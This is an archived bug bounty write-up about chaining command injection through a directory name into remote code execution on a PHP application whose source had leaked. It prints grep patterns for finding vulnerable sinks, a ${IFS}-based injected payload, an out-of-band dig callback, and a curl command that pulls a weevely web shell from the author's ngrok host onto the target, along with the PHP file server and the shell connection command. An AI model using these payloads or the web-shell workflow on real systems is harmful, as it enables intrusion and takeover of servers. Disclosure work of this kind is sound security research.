# Hardcore RCE via directory name for $3.000

- **Source URL:** https://medium.com/@levshmelevv/hardcore-rce-via-directory-name-for-3-000-225ed58b41a9?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250220081733/https://medium.com/@levshmelevv/hardcore-rce-via-directory-name-for-3-000-225ed58b41a9
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/2696 (id 2696)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Hardcore RCE in leaked PHP source code for $3.000

This writeup could be considered a continuation of my previous findings for $10,000. 

Previously, I was able to access the source code through an exposed .git directory where the RCE vulnerability was located. After I explored the vulnerability, I continued to examine the code in search of other vulnerabilities. 

Luckily, I found another, more complex RCE, through the directory creation functionality. 

You’ll like it=)

Note: I recommend reading my [previous writeup](/@levshmelevv/10-000-bounty-for-exposed-git-to-rce-304c7e1f54) to understand how I gained access to the web application’s source code.”


First of all, to find vulnerabilities in the source code, you need to identify potential entry points. Tools like SonarQube can be used for this purpose, but I prefer using old school grep.

Here are a couple of examples for PHP:

## **XSS:**

`grep -Ri "\$_" . | grep "echo"`

`grep -Ri "\$_GET" . | grep "echo"`

`grep -Ri "\$_POST" . | grep "echo"`

`grep -Ri "\$_REQUEST" . | grep "echo"`

## Command execution:

`grep -Ri "shell_exec(" .`

`grep -Ri "system(" .`

`grep -Ri "exec(" .`

## Code execution:

`grep -Ri "eval(" .`

`grep -Ri "assert(" .`

`grep -Ri "preg_replace" . | grep "/e"`

## SQL Injection:

`grep -Ri "\$sql" .`

`grep -Ri "\$sql" . | grep "\$_"`

## RFI/LFI:

`grep -Ri "file_include" .`

`grep -Ri "include(" .`

`grep -Ri "require(" .`

`grep -Ri "include_once(" .`

`grep -Ri "require_once(" .`

`grep -Ri "require_once(" . | grep "\$_"`

# Chapter 1

After scanning the code, I focused on this section, where the @exec() function is used. Through this function, I’ll attempt to gain RCE.

The purpose of this code is to determine the sizes of the files. First of all, on line 40, ***scandir()*** is called, returning an array of directory contents. Next, the names of files and directories are filtered through ***preg\_replace()*** and sent to the ***filesize64()*** function, where the ***@exec()*** call is located.

Very cool, but this code does not accept any user input for injection, except for the contents of the ***/home/html/ftp-upload/uploads/OELxI386/*** directory, over which I have no control. Therefore, I set this code aside for a few weeks…

# Chapter 2

After a while, I decided to double-check how my previous RCE was fixed on this resource. I tried using different payloads and accidentally discovered that if I specify two values separated by a space (test%20somename) in the adduser parameter, such as in this URL: 

[http://example.com/ftp-upload/sync.php?adduser=**test%20someuser**&secret1=\[secret1\]&secret2=\[secret2\]](http://s11.example.com/ftp-upload/sync.php?adduser=test+someuser&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D) — the value after the space will be used to create a directory with the same name in the same location as the PHP file.

The code that is responsible for this:

Thus, passing values with a space, the code for creating a directory will look like this:

`mkdir /home/html/ftp-upload/uploads/test somename`
# Chapter 3

The ability to create my own directories led me to the idea of using this to inject a payload into ***@exec()*** and use this chain to achieve RCE.

The first thought was to try creating a directory with a payload in the name, which will send a request to my server. 

If the request arrives, then the code has been successfully executed.

For this, I used the ***dig*** command:

`dig%20rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com`
And in order for a directory with such a name to be read by ***scandir()***, we create it in *uploads/OELxI386/*

## Request:

But nothing worked because of the use of a space in the payload, when it gets into the mkdir command, the space separates the payload and creates three directories:

`mkdir /home/html/ftp-upload/uploads/test uploads/OELxI386/dig rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com`
Therefore, our payload should not include spaces, they can be replaced with **${IFS}**.

Final request:

[http://example.com/ftp-upload/sync.php?adduser=**test%20uploads/OELxI386/**](http://s11.example.com/ftp-upload/sync.php?adduser=test+uploads%2FOELxI386%2Fdig%24%7BIFS%7Drce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D)**\`dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com\`**[&secret1=\[secret1\]&secret2=\[secret2\]](http://s11.example.com/ftp-upload/sync.php?adduser=test+uploads%2FOELxI386%2Fdig%24%7BIFS%7Drce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D)

Great! 

The directory with the payload in the name has been created and now it’s necessary to run the script with the vulnerable function that reads the contents of the directory. For this, we need to go to [http://example.com/ftp-upload/testSize.php](http://s11.example.com/ftp-upload/testSize.php)

We see that the script has worked:

And the request has successfully arrived. This is RCE!

Let’s repeat what happened here:

1. We send a request to create a directory with the payload in the place we need: 
[http://example.com/ftp-upload/sync.php?adduser=test%20**uploads/OELxI386/dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com**&secret1=\[secret1\]&secret2=\[secret2\]](http://s11.example.com/ftp-upload/sync.php?adduser=test+uploads%2FOELxI386%2Fdig%24%7BIFS%7Drce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D)
2. The payload is sent to the script that creates the directory.

The command that will be executed on the server side is:

`mkdir /home/html/ftp-upload/uploads/test uploads/OELxI386/dig${IFS}rce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com`
3\. We start the directory reading script: 

[http://example.com/ftp-upload/testSize.php](http://s11.example.com/ftp-upload/testSize.php)

The script reads the contents of the directory ***/home/html/ftp-upload/uploads/OELxI386/*** (into which we uploaded the payload)

and passes it to the ***filesize64()*** function where the call of the code with our payload happens.

It is passed to the ***filesize64()*** function where the call of the code with our payload occurs.

# Chapter 4

All that’s left is to upload a shell for unimpeded code execution on the server.

Let’s move on to the reproduction steps:

1. Create a shell using [weevely](https://github.com/epinna/weevely3) and save it as txt

`weevely generate 123pass shell.txt`
2\. Create an **index.php** file that will be used on our server to upload the shell.

```
<?php
$attachment_location = "shell.txt";
if (file_exists($attachment_location)) {
header($_SERVER["SERVER_PROTOCOL"] . " 200 OK");
header("Cache-Control: public");
header("Content-Type: plane/text");
header("Content-Transfer-Encoding: Binary");
header("Content-Length:".filesize($attachment_location));
header("Content-Disposition: attachment; filename=shell.php");
readfile($attachment_location);
die();
} else {
die("Error: File not found.");
}
```
When making a request to this script, the vulnerable server will take our **shell.txt** and save it as **shell.php**. In this way, **shell.php** will be uploaded to the vulnerable server.

3\. Set up a local PHP server and tunnel the connection using ngrok

`php -S 127.0.0.1:8889 index.php``ngrok http -subdomain=rce 8889 -scheme http -scheme https`
4\. The last step is to create the final payload that will upload our shell to the server. 

Since the server still has filtering, it took a bit of brainstorming, and as a result, I got the following payload:

`uploads/OELxI386/`**\`cd${IFS}errors%26%26curl${IFS}rce.eu.ngrok.io${IFS}-o${IFS}shell.php\`**

The payload will execute the following commands on the vulnerable server:

```
cd errors #To go to a writable directory
curl rce.eu.ngrok.io -o shell.php #The command that will download the shell to the vulnerable server
```
Since the server uses filtering in the form of the ***preg\_match(‘/\[\/:”\*?\<>|\]+/’, $f)***, it was not possible to use slashes in the code.

Result: 

[http://example.com/ftp-upload/sync.php?adduser=**test%20uploads/OELxI386/**](http://s11.example.com/ftp-upload/sync.php?adduser=test+uploads%2FOELxI386%2Fdig%24%7BIFS%7Drce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D)**\`cd${IFS}errors%26%26curl${IFS}rce.eu.ngrok.io${IFS}-o${IFS}shell.php\`**[&secret1=\[secret1\]&secret2=\[secret2\]](http://s11.example.com/ftp-upload/sync.php?adduser=test+uploads%2FOELxI386%2Fdig%24%7BIFS%7Drce.ct9zmv3v0e1uai2y5bc9q2b0grmka9.oastify.com&secret1=%5Bsecret1%5D&secret2=%5Bsecret2%5D)

5\. We invoke the script to execute the code

[http://example.com/ftp-upload/testSize.php](http://s11.example.com/ftp-upload/testSize.php)

After which, we receive a request on our server

And we check the ***errors/*** directory for the presence of the shell

And it’s there!

6\. All that’s left is to connect to it and execute commands

`weevely http://example.com/ftp-upload/errors/shell.php 123pass`
Now we can go celebrate at the nearby bar.

After a few days of corrections, the team rewarded me with a bounty (as is traditional, a motivational screenshot =))

This time they paid me a lot less than I expected, and the company explained it like this:

This is the downside of bug hunting on self-hosted platforms.

I hope I was able to clearly tell you about a interesting case with vulnerability exploitation. Happy hunting and lots of bounty to everyone!

Reach me on [Linkedin](https://www.linkedin.com/in/levsaar/)
